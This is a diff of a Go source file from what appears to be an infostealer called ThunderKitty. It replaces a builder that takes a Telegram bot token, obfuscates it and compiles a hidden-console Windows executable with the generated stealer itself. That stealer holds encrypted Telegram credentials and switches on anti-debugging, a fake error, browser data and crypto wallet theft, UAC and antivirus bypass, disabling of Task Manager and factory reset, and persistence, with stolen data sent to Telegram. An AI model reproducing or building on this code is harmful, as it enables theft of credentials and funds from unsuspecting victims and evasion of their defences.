@@ -1,59 +1,6 @@
 package main
 
 import (
-	"encoding/base64"
-	"fmt"
-	"math/rand"
-	"os"
-	"os/exec"
-	"text/template"
-	"time"
-	"github.com/fatih/color"
-)
-
-type Config struct {
-	TeleBotToken        string
-	TeleChatID          string
-	EnableAntiDebug     bool
-	EnableFakeError     bool
-	EnableBrowsers      bool
-	HideConsole         bool
-	DisableFactoryReset bool
-	DisableTaskManager  bool
-	EnablePersistence   bool
-	EnableTokenGrabber  bool
-	EnableCryptoWallets bool
-	Key                 byte
-}
-
-func EncryptString(input string, key byte) string {
-	data := []byte(input)
-	encrypted := make([]byte, len(data))
-	for i := 0; i < len(data); i++ {
-		shiftedKey := (key << 2) | (key >> 3)
-		reversed := ((data[i] & 0xF0) >> 4) | ((data[i] & 0x0F) << 4)
-		encrypted[i] = (reversed + byte(i)) ^ shiftedKey
-	}
-	return base64.StdEncoding.EncodeToString(encrypted)
-}
-
-func GenerateRandomVarName() string {
-	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-	var name string
-	for i := 0; i < 10; i++ {
-		name += string(letters[rand.Intn(len(letters))])
-	}
-	return name
-}
-
-func buildExecutable(cfg Config) {
-	randomTokenVar := GenerateRandomVarName()
-	randomChatIDVar := GenerateRandomVarName()
-	randomKeyVar := GenerateRandomVarName()
-
-	const templateContent = `package main
-
-import (
 	"Caca/pkg/utils/hc"
 	"Caca/core/antidbgandvm"
 	"Caca/pkg/utils/mutex"
@@ -64,6 +11,8 @@ import (
 	"Caca/core/persistence"
 	"Caca/core/cryptowallets" 
 	"Caca/core/telegram"
+	"Caca/core/uac"
+	"Caca/core/antivirus"
     "os"
 	"os/exec"
 	"fmt"
@@ -77,9 +26,9 @@ import (
 )
 
 const (
-	{{.RandomTokenVar}} = "{{.TeleBotToken}}"
-	{{.RandomChatIDVar}}   = "{{.TeleChatID}}"
-	{{.RandomKeyVar}}       = {{.Key}}
+	cMHIiMNbqt = "dONiweDPzu3cq1ro15bF5ZJzjlD+HNttOfnWhoW1tWGxcpJ+bexdPIrJWraIhw=="
+	CNYdQlARhq   = "5OOC8bDvbq2M2w=="
+	TaxtNiteip       = 61
 )
 
 func DecryptString(input string, key byte) string {
@@ -154,10 +103,10 @@ func killBrowsers() {
 func main() {
 	var wg sync.WaitGroup
 
-	TelegramBotToken := DecryptString({{.RandomTokenVar}}, {{.RandomKeyVar}})
-	TelegramChatId := DecryptString({{.RandomChatIDVar}}, {{.RandomKeyVar}})
+	TelegramBotToken := DecryptString(cMHIiMNbqt, TaxtNiteip)
+	TelegramChatId := DecryptString(CNYdQlARhq, TaxtNiteip)
 
-	if {{.HideConsole}} {
+	if true {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -167,13 +116,13 @@ func main() {
 		fmt.Println("Hide console not enabled")
 	}
 
-	if {{.EnableAntiDebug}} {
+	if true {
 		AntiDebugVMAnalysis.Check()
 	} else {
 		fmt.Println("Anti-debugging and VM analysis not enabled")
 	}
 
-	if {{.EnableFakeError}} {
+	if true {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -190,7 +139,7 @@ func main() {
 	}()
 	killBrowsers()
 
-	if {{.EnableBrowsers}} {
+	if true {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -200,7 +149,27 @@ func main() {
 		fmt.Println("Browser info grabbing not enabled")
 	}
 
-	if {{.EnableCryptoWallets}} {
+	if true {
+	    wg.Add(1)
+        go func() {
+		    defer wg.Done()
+			Uac.Run()
+        }()
+	} else {
+	 fmt.Println("UAC bypass not enabled")
+    }
+
+	if true {
+	    wg.Add(1)
+        go func() {
+		    defer wg.Done()
+			antivirus.Run()
+        }()
+	} else {
+	 fmt.Println("Anti-Virus bypass not enabled")
+    }
+
+	if true {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -210,7 +179,7 @@ func main() {
 		fmt.Println("Crypto Wallets not enabled")
 	}
 
-	if {{.DisableFactoryReset}} {
+	if true {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -220,7 +189,7 @@ func main() {
 		fmt.Println("Factory reset not disabled")
 	}
 
-	if {{.DisableTaskManager}} {
+	if true {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -230,7 +199,7 @@ func main() {
 		fmt.Println("Task manager not disabled")
 	}
 
-	if {{.EnablePersistence}} {
+	if true {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -257,123 +226,4 @@ func main() {
 	} else {
 		fmt.Println("Document sent successfully.")
 	}
-}
-`
-	tmpl, err := template.New("main").Parse(templateContent)
-	if err != nil {
-		fmt.Println("Error parsing template:", err)
-		return
-	}
-
-	file, err := os.Create("main.go")
-	if err != nil {
-		fmt.Println("Error creating main.go:", err)
-		return
-	}
-	defer file.Close()
-
-	err = tmpl.Execute(file, map[string]interface{}{
-		"TeleBotToken":        cfg.TeleBotToken,
-		"TeleChatID":          cfg.TeleChatID,
-		"Key":                 cfg.Key,
-		"RandomTokenVar":      randomTokenVar,
-		"RandomChatIDVar":     randomChatIDVar,
-		"RandomKeyVar":        randomKeyVar,
-		"HideConsole":         cfg.HideConsole,
-		"EnableAntiDebug":     cfg.EnableAntiDebug,
-		"EnableFakeError":     cfg.EnableFakeError,
-		"EnableBrowsers":      cfg.EnableBrowsers,
-		"EnableCryptoWallets": cfg.EnableCryptoWallets,
-		"DisableFactoryReset": cfg.DisableFactoryReset,
-		"DisableTaskManager":  cfg.DisableTaskManager,
-		"EnablePersistence":   cfg.EnablePersistence,
-	})
-	if err != nil {
-		fmt.Println("Error executing template:", err)
-		return
-	}
-
-	ldflags := "-s -w"
-	if cfg.HideConsole {
-		ldflags += " -H=windowsgui"
-	}
-	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "ThunderKitty-Built.exe", "main.go")
-
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-
-	err = cmd.Run()
-	if err != nil {
-		fmt.Println("Error building executable:", err)
-		return
-	}
-
-	fmt.Println("Build successful")
-}
-
-func main() {
-	rand.Seed(time.Now().UnixNano())
-	cyan := color.New(color.FgCyan).SprintFunc()
-
-	fmt.Println(cyan("Please enter your Telegram Bot Token:"))
-	var teleBotToken string
-	fmt.Scanln(&teleBotToken)
-
-	fmt.Println(cyan("Please enter your Telegram Chat ID:"))
-	var teleChatID string
-	fmt.Scanln(&teleChatID)
-
-	var enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager, enablePersistence, enableCryptoWallets bool
-
-	fmt.Println(cyan("Enable Anti-Debugging? (yes/no):"))
-	var input string
-	fmt.Scanln(&input)
-	enableAntiDebug = input == "yes"
-
-	fmt.Println(cyan("Enable Fake Error? (yes/no):"))
-	fmt.Scanln(&input)
-	enableFakeError = input == "yes"
-
-	fmt.Println(cyan("Enable Browsers Info Grabbing? (yes/no):"))
-	fmt.Scanln(&input)
-	enableBrowsers = input == "yes"
-
-	fmt.Println(cyan("Enable Crypto Wallets? (yes/no):"))
-	fmt.Scanln(&input)
-	enableCryptoWallets = input == "yes"
-
-	fmt.Println(cyan("Hide Console? (yes/no):"))
-	fmt.Scanln(&input)
-	hideConsole = input == "yes"
-
-	fmt.Println(cyan("Disable Factory Reset? (yes/no):"))
-	fmt.Scanln(&input)
-	disableFactoryReset = input == "yes"
-
-	fmt.Println(cyan("Disable Task Manager? (yes/no):"))
-	fmt.Scanln(&input)
-	disableTaskManager = input == "yes"
-
-	fmt.Println(cyan("Enable Persistence? (yes/no):"))
-	fmt.Scanln(&input)
-	enablePersistence = input == "yes"
-
-	key := byte(rand.Intn(256))
-
-	cfg := Config{
-		TeleBotToken:        EncryptString(teleBotToken, key),
-		TeleChatID:          EncryptString(teleChatID, key),
-		EnableAntiDebug:     enableAntiDebug,
-		EnableFakeError:     enableFakeError,
-		EnableBrowsers:      enableBrowsers,
-		HideConsole:         hideConsole,
-		DisableFactoryReset: disableFactoryReset,
-		DisableTaskManager:  disableTaskManager,
-		EnablePersistence:   enablePersistence,
-		EnableCryptoWallets: enableCryptoWallets,
-		Key:                 key,
-	}
-
-	buildExecutable(cfg)
-	fmt.Scanln()
 }
